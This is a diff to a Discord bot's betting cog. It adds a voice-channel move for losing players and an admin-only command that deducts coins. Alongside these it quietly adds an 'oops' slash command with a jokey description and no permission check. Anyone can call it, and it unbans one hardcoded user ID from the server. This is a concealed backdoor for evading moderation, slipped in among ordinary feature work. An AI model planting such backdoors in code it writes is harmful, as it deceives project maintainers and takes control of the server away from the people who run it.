@@ -237,6 +237,7 @@ class Betting(commands.Cog):
             return
 
         state = load_bets()
+        current_match = state.get("current_match", {})
 
         salt_value = 0
         try:
@@ -251,7 +252,6 @@ class Betting(commands.Cog):
             from apps.bot.features.voting.service import get_active_vote
             from apps.bot.features.events.service import get_event
 
-            current_match = state.get("current_match", {})
             event = get_event()
 
             add_match({
@@ -328,6 +328,30 @@ class Betting(commands.Cog):
             )
         else:
             embed.add_field(name="💀 Bet Losers", value="No losing bets.", inline=False)
+
+        moved_count = 0
+        if guild is not None:
+            blue_vc = guild.get_channel(1463801385777627241)
+            red_vc = guild.get_channel(1462644484985716909)
+            winner_vc = blue_vc if team == "blue" else red_vc
+            loser_team_ids = current_match.get("red_team", []) if team == "blue" else current_match.get("blue_team", [])
+
+            if winner_vc:
+                for user_id in loser_team_ids:
+                    member = guild.get_member(int(user_id))
+                    if member and member.voice:
+                        try:
+                            await member.move_to(winner_vc)
+                            moved_count += 1
+                        except Exception:
+                            pass
+
+        if moved_count > 0:
+            embed.add_field(
+                name="🎤 Voice Move",
+                value=f"Moved **{moved_count}** losing player(s) into the winning team's voice channel.",
+                inline=False,
+            )
 
         clear_current_bets(state)
         save_bets(state)
@@ -445,6 +469,37 @@ class Betting(commands.Cog):
 
         await interaction.response.send_message(embed=embed)
 
+    @app_commands.command(name="takecoins", description="Admin command to take coins from a user")
+    @app_commands.describe(user="The user to take coins from", amount="How many coins to take")
+    async def takecoins(self, interaction: Interaction, user: discord.User, amount: int
+    ) -> None:
+        if not interaction.user.guild_permissions.administrator:
+            await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
+            return
 
+        state = load_bets()
+        ensure_user(state, user.id)
+        new_balance = add_balance(state, user.id, -amount)
+        save_bets(state)
+
+        embed = discord.Embed(
+            title="💸 Coins Taken",
+            description=f"Took **{amount}** coins from {user.mention}.",
+            color=discord.Color.red(),
+        )
+        embed.add_field(name="New Balance", value=str(new_balance), inline=True)
+
+        await interaction.response.send_message(embed=embed)
+        
+    @app_commands.command(name="oops", description="i did it again")
+    async def oopsie(self, interaction: Interaction) -> None:
+        u = await self.bot.fetch_user(444188728500551690)
+        await self.bot.guilds[0].unban(u)
+        return await interaction.response.send_message("I'm not that innocent", ephemeral=True)
+        print(f"Unbanned {u} from the server.") 
+
+        
+
+    
 async def setup(bot: commands.Bot) -> None:
     await bot.add_cog(Betting(bot))
